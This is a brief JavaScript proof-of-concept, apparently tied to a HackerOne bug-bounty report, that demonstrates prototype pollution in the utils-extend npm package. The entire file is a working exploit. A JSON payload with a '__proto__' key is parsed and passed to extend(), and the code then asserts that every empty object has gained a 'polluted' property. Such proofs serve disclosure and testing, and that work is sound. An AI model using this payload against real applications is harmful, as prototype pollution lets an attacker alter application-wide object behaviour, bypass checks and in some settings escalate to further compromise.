//https://hackerone.com/reports/801522

const { assert } = require('@firebase/util');
const { extend } = require('utils-extend');
const payload = '{"__proto__":{"polluted":"yes"}}'
const emptyObject = {}
console.log("Before : " + {}.polluted);
const pollutionObject = JSON.parse(payload);
extend({}, pollutionObject)

console.log("After : "+emptyObject.polluted)  // true
assert({}.polluted === "yes");
console.log("payload success!");